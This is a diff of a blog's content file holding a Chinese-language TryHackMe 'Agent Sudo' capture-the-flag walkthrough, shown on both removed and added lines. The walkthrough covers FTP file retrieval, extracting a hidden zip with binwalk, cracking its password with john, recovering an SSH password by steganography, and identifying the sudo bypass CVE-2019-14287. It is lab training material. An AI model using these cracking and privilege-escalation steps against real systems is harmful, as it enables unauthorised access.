+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Attention chris,</span><br><span class="line"></span><br><span class="line">Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</span><br><span class="line"></span><br><span class="line">From,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
+<p>因此可以获取本题的答案是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chris</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Hash-cracking-and-brute-force">Hash cracking and brute-force</h3>
+<p>FTP password</p>
+<ol>
+<li>
+<p>FTP password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crystal</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/03/05/LI6Zid3JzXKVAYE.png" alt="Tryhackme_5_3"></p>
+</li>
+<li>
+<p>Zip file password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||57590|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt</span><br><span class="line">-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg</span><br><span class="line">-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">mget To_agentJ.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||37193|)</span><br><span class="line">150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).</span><br><span class="line">100% |*************************************************************************************************************|   217       53.09 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">217 bytes received in 00:00 (0.75 KiB/s)</span><br><span class="line">mget cute-alien.jpg [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||42821|)</span><br><span class="line">150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 33143      113.24 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">33143 bytes received in 00:00 (57.12 KiB/s)</span><br><span class="line">mget cutie.png [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||18497|)</span><br><span class="line">150 Opening BINARY mode data connection for cutie.png (34842 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 34842       60.41 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">34842 bytes received in 00:00 (40.51 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>ftp登录之后将文件进行下载，然后寻找相关线索</p>
+<p>将图片分析后发现存在一个压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ binwalk -e cutie.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced</span><br><span class="line">869           0x365           Zlib compressed data, best compression</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;jar xvf &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;jar&#x27;, &#x27;jar xvf &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class="line">34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt</span><br><span class="line">34820         0x8804          End of Zip archive, footer length: 22</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>分离开后确实有密码，开始爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/_cutie.png.extracted]</span><br><span class="line">└─$ john hash                                             </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])</span><br><span class="line">Cost 1 (HMAC size) is 78 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">alien            (8702.zip/To_agentR.txt)     </span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2024-03-05 01:33) 1.315g/s 58478p/s 58478c/s 58478C/s 123456..Peter</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alien</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>steg password</p>
+<p>解压上述压缩包后我们得到一段信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Agent C,</span><br><span class="line">We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!</span><br><span class="line">By,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
+<p>base64后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Area51</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Who is the other agent (in full name)?</p>
+<p>从cute-alien.jpg中提取数据，然后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi james,</span><br><span class="line"></span><br><span class="line">Glad you find this message. Your login password is hackerrules!</span><br><span class="line"></span><br><span class="line">Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.</span><br><span class="line"></span><br><span class="line">Your buddy,</span><br><span class="line">chris</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>SSH password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerrules</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Capture-the-user-flag">Capture the user flag</h3>
+<ol>
+<li>
+<p>What is the user flag?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ^[[200~ssh james@10.10.212.207   ~</span><br><span class="line">zsh: bad pattern: ^[[200~ssh</span><br><span class="line">                                                                                                                                                          </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh james@10.10.212.207   </span><br><span class="line">The authenticity of host &#x27;10.10.212.207 (10.10.212.207)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.</span><br><span class="line">This host key is known by the following other names/addresses:</span><br><span class="line">    ~/.ssh/known_hosts:1: [hashed name]</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.212.207&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">james@10.10.212.207&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> System information disabled due to load higher than 1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">75 packages can be updated.</span><br><span class="line">33 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Oct 29 14:26:27 2019</span><br><span class="line">james@agent-sudo:~$ ls</span><br><span class="line">Alien_autospy.jpg  user_flag.txt</span><br><span class="line">james@agent-sudo:~$ cat user_flag.txt </span><br><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
+<p>因此可以得到本题的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>What is the incident of the photo called?</p>
+<p>在该文件下还发现存在一个图片，传输至本地查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo scp james@10.10.212.207:Alien_autospy.jpg ~/</span><br></pre></td></tr></table></figure>
+<p>尝试传输发现权限不足</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, user james is not allowed to execute &#x27;/usr/bin/scp james@10.10.212.207:Alien_autospy.jpg /home/james/&#x27; as root on agent-sudo.</span><br></pre></td></tr></table></figure>
+<p>枚举一下权限组信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">james@agent-sudo:~$ sudo -l</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Matching Defaults entries for james on agent-sudo:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on agent-sudo:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>提权步骤看下面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Roswell alien autopsy</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Privilege-escalation">Privilege escalation</h3>
+<ol>
+<li>
+<p>CVE number for the escalation</p>
+<p>查询关键词</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure>
+<p>发现存在漏洞<a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass - Linux local Exploit (exploit-db.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-14287</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>What is the root flag?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@agent-sudo:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@agent-sudo:/root# cat root.txt </span><br><span class="line">To Mr.hacker,</span><br><span class="line"></span><br><span class="line">Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. </span><br><span class="line"></span><br><span class="line">Your flag is </span><br><span class="line">b53a02f55b57d4439e3341834d70c062</span><br><span class="line"></span><br><span class="line">By,</span><br><span class="line">DesKel a.k.a Agent R</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>(Bonus) Who is Agent R?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DesKel</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/03/05/vhJLdnYr8VDmCqj.png" alt="Tryhackme_5_4"></p>
 ]]></content>
       <categories>
         <category>Tryhackme</category>
@@ -2488,115 +2631,6 @@ FFI是PHP中调用C代码的手段
 <p>在这里找到相关的提权方式</p>
 <p><img src="https://s2.loli.net/2024/02/27/tPw5OLoF8iXcBaA.png" alt="Tryhackme_4_4"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Tryhackme</category>
-      </categories>
-      <tags>
-        <tag>Tryhackme</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tryhackme_Diary-5</title>
-    <url>/2024/03/05/Tryhackme_Diary-5/</url>
-    <content><![CDATA[<h1>Tryhackme_Diary-5</h1>
-<h2 id="Agent-Sudo">Agent Sudo</h2>
-<h3 id="Enumerate">Enumerate</h3>
-<ol>
-<li>
-<p>How many open ports?</p>
-<p>可能是因为网络延迟的问题，导致开始的时候一个端口都没扫描出来，延时可以适当开高一点点</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2024/03/05/pV4LatyfSXNCl35.png" alt="Tryhackme_5_1"></p>
-</li>
-<li>
-<p>How you redirect yourself to a secret page?</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-agent</span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2024/03/05/OlMXjakTzYwE74N.png" alt="Tryhackme_5_2"></p>
-</li>
-<li>
-<p>What is the agent name?</p>
-<p>user-agent参数为C的时候，可以收到回复</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Attention chris,</span><br><span class="line"></span><br><span class="line">Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</span><br><span class="line"></span><br><span class="line">From,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
-<p>因此可以获取本题的答案是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chris</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="Hash-cracking-and-brute-force">Hash cracking and brute-force</h3>
-<p>FTP password</p>
-<ol>
-<li>
-<p>FTP password</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crystal</span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2024/03/05/LI6Zid3JzXKVAYE.png" alt="Tryhackme_5_3"></p>
-</li>
-<li>
-<p>Zip file password</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||57590|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt</span><br><span class="line">-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg</span><br><span class="line">-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">mget To_agentJ.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||37193|)</span><br><span class="line">150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).</span><br><span class="line">100% |*************************************************************************************************************|   217       53.09 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">217 bytes received in 00:00 (0.75 KiB/s)</span><br><span class="line">mget cute-alien.jpg [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||42821|)</span><br><span class="line">150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 33143      113.24 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">33143 bytes received in 00:00 (57.12 KiB/s)</span><br><span class="line">mget cutie.png [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||18497|)</span><br><span class="line">150 Opening BINARY mode data connection for cutie.png (34842 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 34842       60.41 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">34842 bytes received in 00:00 (40.51 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>ftp登录之后将文件进行下载，然后寻找相关线索</p>
-<p>将图片分析后发现存在一个压缩包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ binwalk -e cutie.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced</span><br><span class="line">869           0x365           Zlib compressed data, best compression</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;jar xvf &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;jar&#x27;, &#x27;jar xvf &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class="line">34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt</span><br><span class="line">34820         0x8804          End of Zip archive, footer length: 22</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>分离开后确实有密码，开始爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/_cutie.png.extracted]</span><br><span class="line">└─$ john hash                                             </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])</span><br><span class="line">Cost 1 (HMAC size) is 78 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">alien            (8702.zip/To_agentR.txt)     </span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2024-03-05 01:33) 1.315g/s 58478p/s 58478c/s 58478C/s 123456..Peter</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>得到密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alien</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>steg password</p>
-<p>解压上述压缩包后我们得到一段信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Agent C,</span><br><span class="line">We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!</span><br><span class="line">By,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
-<p>base64后得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Area51</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>Who is the other agent (in full name)?</p>
-<p>从cute-alien.jpg中提取数据，然后得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi james,</span><br><span class="line"></span><br><span class="line">Glad you find this message. Your login password is hackerrules!</span><br><span class="line"></span><br><span class="line">Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.</span><br><span class="line"></span><br><span class="line">Your buddy,</span><br><span class="line">chris</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>SSH password</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerrules</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="Capture-the-user-flag">Capture the user flag</h3>
-<ol>
-<li>
-<p>What is the user flag?</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ^[[200~ssh james@10.10.212.207   ~</span><br><span class="line">zsh: bad pattern: ^[[200~ssh</span><br><span class="line">                                                                                                                                                          </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh james@10.10.212.207   </span><br><span class="line">The authenticity of host &#x27;10.10.212.207 (10.10.212.207)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.</span><br><span class="line">This host key is known by the following other names/addresses:</span><br><span class="line">    ~/.ssh/known_hosts:1: [hashed name]</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.212.207&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">james@10.10.212.207&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> System information disabled due to load higher than 1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">75 packages can be updated.</span><br><span class="line">33 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Oct 29 14:26:27 2019</span><br><span class="line">james@agent-sudo:~$ ls</span><br><span class="line">Alien_autospy.jpg  user_flag.txt</span><br><span class="line">james@agent-sudo:~$ cat user_flag.txt </span><br><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
-<p>因此可以得到本题的flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>What is the incident of the photo called?</p>
-<p>在该文件下还发现存在一个图片，传输至本地查看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo scp james@10.10.212.207:Alien_autospy.jpg ~/</span><br></pre></td></tr></table></figure>
-<p>尝试传输发现权限不足</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, user james is not allowed to execute &#x27;/usr/bin/scp james@10.10.212.207:Alien_autospy.jpg /home/james/&#x27; as root on agent-sudo.</span><br></pre></td></tr></table></figure>
-<p>枚举一下权限组信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">james@agent-sudo:~$ sudo -l</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Matching Defaults entries for james on agent-sudo:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on agent-sudo:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>提权步骤看下面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Roswell alien autopsy</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="Privilege-escalation">Privilege escalation</h3>
-<ol>
-<li>
-<p>CVE number for the escalation</p>
-<p>查询关键词</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure>
-<p>发现存在漏洞<a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass - Linux local Exploit (exploit-db.com)</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-14287</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>What is the root flag?</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@agent-sudo:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@agent-sudo:/root# cat root.txt </span><br><span class="line">To Mr.hacker,</span><br><span class="line"></span><br><span class="line">Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. </span><br><span class="line"></span><br><span class="line">Your flag is </span><br><span class="line">b53a02f55b57d4439e3341834d70c062</span><br><span class="line"></span><br><span class="line">By,</span><br><span class="line">DesKel a.k.a Agent R</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>(Bonus) Who is Agent R?</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DesKel</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p><img src="https://s2.loli.net/2024/03/05/vhJLdnYr8VDmCqj.png" alt="Tryhackme_5_4"></p>
 ]]></content>
       <categories>
         <category>Tryhackme</category>
